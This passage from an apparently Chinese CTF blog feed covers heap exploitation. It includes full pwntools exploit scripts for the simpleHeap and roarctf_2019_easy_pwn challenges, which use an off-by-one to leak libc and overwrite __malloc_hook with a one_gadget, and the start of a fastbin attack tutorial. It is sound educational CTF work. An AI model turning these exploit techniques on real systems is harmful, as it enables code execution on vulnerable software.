class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./vn_pwn_simpleHeap&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node3.buuoj.cn&quot;,29864)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./vn_pwn_simpleHeap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;./libc-2.23.so&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">create(<span class="number">0x48</span>,<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;y&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\xc1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x48</span>,<span class="string">&#x27;yyds&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x3c4b78</span></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc_hook:&quot;</span>+<span class="built_in">hex</span>(realloc_hook))</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc:&quot;</span>+<span class="built_in">hex</span>(realloc))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;skye&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(malloc_hook-<span class="number">27</span>-<span class="number">8</span>)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line"><span class="comment"># one = [0x45216,0x4526a,0xf02a4,0xf1147]</span></span><br><span class="line">onegadget = libc_base + one[<span class="number">1</span>]</span><br><span class="line">log.info(<span class="string">&quot;one:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">11</span> + p64(onegadget) + p64(realloc+<span class="number">12</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment"># create(0x10,&#x27;skye,yyds&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h3><h4 id="基本功能-1"><a href="#基本功能-1" class="headerlink" title="基本功能"></a>基本功能</h4><p>一个堆管理器，有增删查改功能。所有功能都是基于列表的下标定位操作对象。用 3 个列表维护堆：chunk_inuse、chunk_size、chunk_ptr。</p><h4 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h4><p>在 edit 功能里面 sub_E26 函数，这个函数用来处理输入长度的，具体代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">check_size</span><span class="params">(<span class="keyword">signed</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> input_length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size &gt; (<span class="keyword">signed</span> <span class="keyword">int</span>)input_length )</span><br><span class="line">    <span class="keyword">return</span> input_length;</span><br><span class="line">  <span class="keyword">if</span> ( input_length - size == <span class="number">10</span> )</span><br><span class="line">    LODWORD(result) = size + <span class="number">1</span>;<span class="comment">//off by one</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    LODWORD(result) = size;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们要求写入的长度（input_length）大于堆 size 10 个字节时，就可以写入 size + 1 字节，造成 off by one 。</p><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>这条题目和 <code>[V&amp;N2020 公开赛]simpleHeap</code> 思路一样。</p><p>使用 off by one 伪造 chunk size，造成 chunk extend ，再利用 unsorted bin 的特点，泄露出 unsorted bin fd 指针的 libc 地址。</p><p>将上一步中的 chunk extend 剩下在 bin 中的内存申请出来，造成两个指针指向同一个地址，配合 edit 功能实现 houst of spirit ，劫持 __malloc_hook 。</p><p>实际测试后全部 onegadget 因为栈环境问题都无法打通，需要结合 malloc_hook 、 realloc_hook 调整栈环境才能打通。</p><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./roarctf_2019_easy_pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29259</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./roarctf_2019_easy_pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>)<span class="comment">#overwrite</span></span><br><span class="line">create(<span class="number">0x68</span>)</span><br><span class="line">create(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#protect</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\xe1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload)-<span class="number">1</span>+<span class="number">10</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x68</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x3c4b78</span></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc:&quot;</span>+<span class="built_in">hex</span>(realloc))</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc_hook:&quot;</span>+<span class="built_in">hex</span>(realloc_hook))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(malloc_hook-<span class="number">27</span>-<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>)</span><br><span class="line">create(<span class="number">0x68</span>)</span><br><span class="line"><span class="comment"># one = [0x45226,0x4527a,0xf0364,0xf1207]</span></span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">onegadget = libc_base + one[<span class="number">1</span>]</span><br><span class="line">log.info(<span class="string">&quot;onegadget:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">11</span> + p64(onegadget) + p64(realloc)</span><br><span class="line">edit(<span class="number">5</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://bbs.pediy.com/thread-246786.htm">[原创]堆的六种利用手法</a></li><li><a href="https://blog.csdn.net/breeze_cat/article/details/103789081">[pwn]堆：realloc_hook控制栈结构达成onegadget</a></li><li><a href="https://xz.aliyun.com/t/6559">pwn学习系列之Extend the chunk及realloc_hook利用</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆 </tag>
            
            <tag> realloc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastbin Attack</title>
      <link href="archives/782a5527/"/>
      <url>archives/782a5527/</url>
      
        <content type="html"><![CDATA[<h1 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>fastbin attack 是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。这类利用的前提是：</p><ul><li>存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞</li><li>漏洞发生于 fastbin 类型的 chunk 中</li></ul><p>如果细分的话，可以做如下的分类：</p><ul><li>Fastbin Double Free</li><li>House of Spirit</li><li>Alloc to Stack</li><li>Arbitrary Alloc</li></ul><p>其中，前两种主要漏洞侧重于利用 <code>free</code> 函数释放<strong>真的 chunk 或伪造的 chunk</strong>，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 <code>fd</code> 指针，直接利用 <code>malloc</code> 申请指定位置 chunk 进行攻击。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>fastbin attack 存在的原因在于 fastbin 是使用单链表来维护释放的堆块的，并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。 我们来看一下 fastbin 是怎样管理空闲 chunk 的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2,*chunk3;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    chunk3=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="comment">//进行释放</span></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">free</span>(chunk3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>释放前</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000041 &lt;&#x3D;&#x3D;&#x3D; chunk1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000041 &lt;&#x3D;&#x3D;&#x3D; chunk2</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000041 &lt;&#x3D;&#x3D;&#x3D; chunk3</span><br><span class="line">0x602090:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020c0:   0x0000000000000000  0x0000000000020f41 &lt;&#x3D;&#x3D;&#x3D; top chunk</span><br></pre></td></tr></table></figure><p>执行三次 free 进行释放后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000041 &lt;&#x3D;&#x3D;&#x3D; chunk1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000041 &lt;&#x3D;&#x3D;&#x3D; chunk2</span><br><span class="line">0x602050:   0x0000000000602000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000041 &lt;&#x3D;&#x3D;&#x3D; chunk3</span><br><span class="line">0x602090:   0x0000000000602040  0x0000000000000000</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020c0:   0x0000000000000000  0x0000000000020f41 &lt;&#x3D;&#x3D;&#x3D; top chunk</span><br></pre></td></tr></table></figure><p>此时位于 main_arena 中的 fastbin 链表中已经储存了指向 chunk3 的指针，并且 chunk 3、2、1 构成了一个单链表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Fastbins[idx&#x3D;2, size&#x3D;0x30,ptr&#x3D;0x602080]</span><br><span class="line">&#x3D;&#x3D;&#x3D;&gt;Chunk(fd&#x3D;0x602040, size&#x3D;0x40, flags&#x3D;PREV_INUSE)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&gt;Chunk(fd&#x3D;0x602000, size&#x3D;0x40, flags&#x3D;PREV_INUSE)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&gt;Chunk(fd&#x3D;0x000000, size&#x3D;0x40, flags&#x3D;PREV_INUSE)</span><br></pre></td></tr></table></figure><h2 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆 (type confused) 的效果。</p><p>Fastbin Double Free 能够成功利用主要有两部分的原因</p><ol><li>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</li><li>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Another simple check: make sure the top of the bin is not the</span></span><br><span class="line"><span class="comment">       record we are going to add (i.e., double free).  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>下面的示例程序说明了这一点，当我们试图执行以下代码时</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2,*chunk3;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你执行这个程序，不出意外的话会得到如下的结果，这正是 _int_free 函数检测到了 fastbin 的 double free。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">*** Error in &#96;.&#x2F;tst&#39;: double free or corruption (fasttop): 0x0000000002200010 ***</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Backtrace: &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6(+0x777e5)[0x7fbb7a36c7e5]</span><br><span class="line">&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6(+0x8037a)[0x7fbb7a37537a]</span><br><span class="line">&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6(cfree+0x4c)[0x7fbb7a37953c]</span><br><span class="line">.&#x2F;tst[0x4005a2]</span><br><span class="line">&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6(__libc_start_main+0xf0)[0x7fbb7a315830]</span><br><span class="line">.&#x2F;tst[0x400499]</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Memory map: &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">00400000-00401000 r-xp 00000000 08:01 1052570                            &#x2F;home&#x2F;Ox9A82&#x2F;tst&#x2F;tst</span><br><span class="line">00600000-00601000 r--p 00000000 08:01 1052570                            &#x2F;home&#x2F;Ox9A82&#x2F;tst&#x2F;tst</span><br><span class="line">00601000-00602000 rw-p 00001000 08:01 1052570                            &#x2F;home&#x2F;Ox9A82&#x2F;tst&#x2F;tst</span><br><span class="line">02200000-02221000 rw-p 00000000 00:00 0                                  [heap]</span><br><span class="line">7fbb74000000-7fbb74021000 rw-p 00000000 00:00 0</span><br><span class="line">7fbb74021000-7fbb78000000 ---p 00000000 00:00 0</span><br><span class="line">7fbb7a0df000-7fbb7a0f5000 r-xp 00000000 08:01 398790                     &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libgcc_s.so.1</span><br><span class="line">7fbb7a0f5000-7fbb7a2f4000 ---p 00016000 08:01 398790                     &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libgcc_s.so.1</span><br><span class="line">7fbb7a2f4000-7fbb7a2f5000 rw-p 00015000 08:01 398790                     &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libgcc_s.so.1</span><br><span class="line">7fbb7a2f5000-7fbb7a4b5000 r-xp 00000000 08:01 415688                     &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">7fbb7a4b5000-7fbb7a6b5000 ---p 001c0000 08:01 415688                     &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">7fbb7a6b5000-7fbb7a6b9000 r--p 001c0000 08:01 415688                     &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">7fbb7a6b9000-7fbb7a6bb000 rw-p 001c4000 08:01 415688                     &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">7fbb7a6bb000-7fbb7a6bf000 rw-p 00000000 00:00 0</span><br><span class="line">7fbb7a6bf000-7fbb7a6e5000 r-xp 00000000 08:01 407367                     &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span 